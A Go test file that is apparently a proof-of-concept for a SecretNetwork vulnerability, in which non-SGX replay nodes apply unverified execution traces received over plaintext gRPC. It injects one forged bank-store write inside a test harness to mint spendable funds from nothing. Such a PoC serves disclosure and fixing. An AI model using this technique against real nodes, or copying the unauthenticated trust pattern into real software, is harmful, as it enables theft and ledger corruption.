package keeper

// PoC for the non-SGX "replay" trace-trust vulnerability.
//
// Root cause: a non-SGX (replay) node fetches per-block execution traces from a
// remote "SGX node" over a PLAINTEXT gRPC connection (insecure.NewCredentials())
// and applies them with ZERO verification. The code comment is explicit:
//   go-cosmwasm/api/replay.go:13  "We trust the SGX node's trace data completely."
//
// Those traces carry `CrossModuleOp`s — raw (storeKey, key, value) writes into
// ARBITRARY module stores (bank, staking, gov, ...). They are applied verbatim by
// the production function ApplyCrossModuleOps (x/compute/internal/keeper/recording_multistore.go),
// called from relay.go:88 and keeper.go in replay mode:
//
//     ApplyCrossModuleOps(ctx.MultiStore(), k.storeKeys, crossOps)
//
// Because the source is unauthenticated (a malicious pool member OR any on-path
// network attacker on the insecure gRPC link) and the data is never checked
// against the block's app hash / a validator signature, the attacker fully
// controls these writes. This test injects ONE malicious CrossModuleOp targeting
// the bank store and shows it mints native funds out of thin air into an
// attacker account — and that the forged balance is fully spendable.
//
// Run: go test -tags nosgx ./x/compute/internal/keeper/ -run TestPoC_NonSGXTraceInflation -v

import (
	"bytes"
	"testing"

	sdk "github.com/cosmos/cosmos-sdk/types"
	banktypes "github.com/cosmos/cosmos-sdk/x/bank/types"
	"github.com/stretchr/testify/require"

	"github.com/scrtlabs/SecretNetwork/go-cosmwasm/api"
)

func TestPoC_NonSGXTraceInflation(t *testing.T) {
	ctx, keepers := CreateTestInput(t, false, SupportedFeatures, nil, nil)
	bk := keepers.BankKeeper
	denom := sdk.DefaultBondDenom

	attacker := sdk.AccAddress([]byte("attacker____________")) // 20 bytes
	source := sdk.AccAddress([]byte("legit_source________"))   // 20 bytes

	// --- baseline: attacker legitimately holds 1 token (so a balance entry exists) ---
	one := sdk.NewCoins(sdk.NewInt64Coin(denom, 1))
	require.NoError(t, bk.MintCoins(ctx, faucetAccountName, one))
	require.NoError(t, bk.SendCoinsFromModuleToAccount(ctx, faucetAccountName, attacker, one))
	require.Equal(t, int64(1), bk.GetBalance(ctx, attacker, denom).Amount.Int64(),
		"attacker should start with exactly 1 token")

	// --- mint 10,000,000 tokens to a throwaway source so we can capture the exact
	//     bank-encoded value bytes for that amount (no encoding guesswork) ---
	const tenMillion = int64(10_000_000_000_000)
	huge := sdk.NewCoins(sdk.NewInt64Coin(denom, tenMillion))
	require.NoError(t, bk.MintCoins(ctx, faucetAccountName, huge))
	require.NoError(t, bk.SendCoinsFromModuleToAccount(ctx, faucetAccountName, source, huge))
	require.Equal(t, tenMillion, bk.GetBalance(ctx, source, denom).Amount.Int64())

	// --- read the raw bank KV store to capture exact (key,value) byte encodings ---
	sk := keepers.WasmKeeper.storeKeys // populated by CreateTestInput via SetStoreKeys
	bankStoreKey := sk[banktypes.StoreKey]
	require.NotNil(t, bankStoreKey, "bank store key must be registered")
	store := ctx.KVStore(bankStoreKey)

	var attackerBalKey, tenMillionVal []byte
	it := store.Iterator(nil, nil)
	for ; it.Valid(); it.Next() {
		k := it.Key()
		if bytes.Contains(k, attacker.Bytes()) && bytes.HasSuffix(k, []byte(denom)) {
			attackerBalKey = append([]byte{}, k...)
		}
		if bytes.Contains(k, source.Bytes()) && bytes.HasSuffix(k, []byte(denom)) {
			tenMillionVal = append([]byte{}, it.Value()...)
		}
	}
	require.NoError(t, it.Close())
	require.NotNil(t, attackerBalKey, "could not locate attacker balance key in bank store")
	require.NotNil(t, tenMillionVal, "could not locate the 10M value encoding in bank store")

	// ================= THE ATTACK =================
	// One attacker-controlled CrossModuleOp, exactly as it would arrive inside a
	// malicious BlockTraces response over the unauthenticated gRPC link, then be
	// stashed by replay.go (SetPendingCrossModuleOps) and applied by the keeper.
	maliciousTrace := []api.CrossModuleOp{
		{
			StoreKey: banktypes.StoreKey, // attacker picks ANY module store
			Key:      attackerBalKey,     // attacker picks the key (their own balance)
			Value:    tenMillionVal,      // attacker picks the value (10,000,000 tokens)
			IsDelete: false,
		},
	}
	// Exact production call site (relay.go:88 / keeper.go):
	ApplyCrossModuleOps(ctx.MultiStore(), keepers.WasmKeeper.storeKeys, maliciousTrace)

	// ================= HARM ASSERTION =================
	// (Orchard-style: balance forged past 10M, with no mint and no transfer to the attacker.)
	bal := bk.GetBalance(ctx, attacker, denom)
	require.Equal(t, tenMillion, bal.Amount.Int64(),
		"attacker balance must be forged to 10,000,000 via the unverified remote trace")

	// Prove the forged funds are REAL and SPENDABLE native value: send almost all away.
	out := sdk.NewCoins(sdk.NewInt64Coin(denom, tenMillion-1))
	require.NoError(t, bk.SendCoins(ctx, attacker, source, out),
		"forged balance must be spendable like genuine funds")
	require.Equal(t, int64(1), bk.GetBalance(ctx, attacker, denom).Amount.Int64())
	// source had 10M, then received (10M-1) of forged funds from the attacker:
	require.Equal(t, tenMillion+(tenMillion-1), bk.GetBalance(ctx, source, denom).Amount.Int64(),
		"source received the forged funds — value created from nothing")

	t.Logf("CONFIRMED: a single attacker-controlled CrossModuleOp inflated the attacker "+
		"balance from 1 to %d %s (no mint, no transfer, no signature, no app-hash check) "+
		"and the funds were then spent as genuine value.", tenMillion, denom)
}
